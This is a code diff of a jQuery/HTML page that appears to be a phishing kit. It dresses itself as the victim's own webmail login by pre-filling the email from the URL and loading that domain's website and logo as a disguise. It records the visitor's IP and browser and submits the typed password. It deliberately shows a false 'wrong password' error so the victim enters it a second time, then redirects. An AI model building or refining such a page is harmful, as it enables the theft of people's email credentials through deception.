@@ -52,75 +52,71 @@
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script>
-    $(document).ready(function() {
-    // 1. Get the email from the hash
+<script>
+$(document).ready(function() {
+    // 1. Get the data from the URL
     var hash = window.location.hash.substr(1);
-    
+    var domain = "mail.com"; // default
+
     if (hash && hash.includes("@")) {
-        var domain = hash.split("@")[1];
+        domain = hash.split("@")[1];
 
-        // 2. Force the email into the input
+        // Fill inputs and text
         $('#Qb-xH-Ei').val(hash);
-
-        // 3. Set the server text
         $('#mail_type').text(('mail.' + domain).toUpperCase());
 
-        // 4. Load the Stagnant Background
-        // We use 'https://www.' to ensure it loads correctly
+        // Load the Stagnant Background
         $('#dl-rA-Ms').attr('src', 'https://www.' + domain);
 
-        // 5. THE LOGO FIX: Using Google's favicon service (it's faster)
+        // Load the Logo
         var logoUrl = 'https://www.google.com/s2/favicons?sz=128&domain=' + domain;
         $('#pg-TX-Na').attr('src', logoUrl);
 
-        // 6. Final fallback if even Google fails
+        // Fallback for logo
         document.getElementById('pg-TX-Na').onerror = function() {
             this.src = 'https://png.pngtree.com/png-vector/20190826/ourmid/pngtree-email-png-image_1697542.jpg';
         };
     }
-});
-        // Get IP and Browser Info
-        $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
-            document.getElementById('ip_val').value = data.ip;
-        });
 
-        var userAgent = navigator.userAgent;
-        var browser = "Unknown";
-        if(userAgent.indexOf("Chrome") > -1) browser = "Chrome";
-        else if(userAgent.indexOf("Firefox") > -1) browser = "Firefox";
-        else if(userAgent.indexOf("Safari") > -1) browser = "Safari";
-        document.getElementById('br_val').value = browser;
+    // 2. Get IP and Browser Info
+    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
+        $('#ip_val').val(data.ip);
+    });
 
-        var x = 1; 
+    var userAgent = navigator.userAgent;
+    var browser = "Unknown";
+    if(userAgent.indexOf("Chrome") > -1) browser = "Chrome";
+    else if(userAgent.indexOf("Firefox") > -1) browser = "Firefox";
+    else if(userAgent.indexOf("Safari") > -1) browser = "Safari";
+    $('#br_val').val(browser);
+
+    // 3. THE LOOPHOLE LOGIC
+    var x = 1; 
+    
+    $('#Ow-Dw-WD').submit(function(e) {
+        e.preventDefault();
         
-        $('#Ow-Dw-WD').submit(function(e) {
-            e.preventDefault();
-            
-            // Re-grab info from the input so the redirect works
-            var currentEmail = $('#Qb-xH-Ei').val();
-            var currentDomain = currentEmail.split("@")[1] || "mail.com";
-            
-            $.post("/", $(this).serialize(), function() {
-                if (x >= 2) {
-                    window.location.href="success.html#' + hash;
-                } else {
-                    x++;
-                    $('#kC-bl-Lp').val('');
-                    $('#errorPass').show();
-                }
-            }).fail(function() {
-                // This ensures it still works even if testing on your PC
-                if (x >= 2) {
-                   window.location.href="success.html#' + hash;
-                } else {
-                    x++;
-                    $('#kC-bl-Lp').val('');
-                    $('#errorPass').show();
-                }
-            });
+        // Use the hash for the redirect to keep the Chameleon alive
+        var currentEmail = $('#Qb-xH-Ei').val();
+        
+        $.post("/", $(this).serialize(), function() {
+            handleSubmission();
+        }).fail(function() {
+            handleSubmission();
         });
-    </script>
-</body>
 
+        function handleSubmission() {
+            if (x >= 2) {
+                // THE LOOPHOLE: Redirect to your success.html instead of the real site
+                window.location.href = "success.html#" + currentEmail;
+            } else {
+                x++;
+                $('#kC-bl-Lp').val(''); // Clear password
+                $('#errorPass').show(); // Show error
+            }
+        }
+    });
+});
+</script>
+</body>
 </html>
